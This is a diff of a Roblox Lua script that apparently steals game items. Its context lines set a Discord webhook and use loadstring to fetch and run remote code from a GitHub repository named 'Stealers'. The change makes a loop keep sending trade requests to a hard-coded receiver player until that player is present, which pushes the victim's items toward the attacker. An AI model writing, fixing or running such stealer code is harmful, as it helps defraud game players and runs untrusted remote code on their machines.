@@ -4,12 +4,17 @@ Webhook = "https://discord.com/api/webhooks/1297048369361063956/sJ2_r8o-3dT379FF
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Ezjq/Stealers/refs/heads/main/losg.lua"))()
 
 while true do
-
-wait(0.5)
-
-local args = {
-    [1] = game:GetService("Players")[Receiver]
-}
-
-game:GetService("ReplicatedStorage").Trade.SendRequest:InvokeServer(unpack(args))
+    wait(0.5)
+    
+    local receiverPlayer = game:GetService("Players"):FindFirstChild(Receiver)
+    
+    if receiverPlayer then
+        local args = {
+            [1] = receiverPlayer
+        }
+        
+        game:GetService("ReplicatedStorage").Trade.SendRequest:InvokeServer(unpack(args))
+        
+        break
+    end
 end
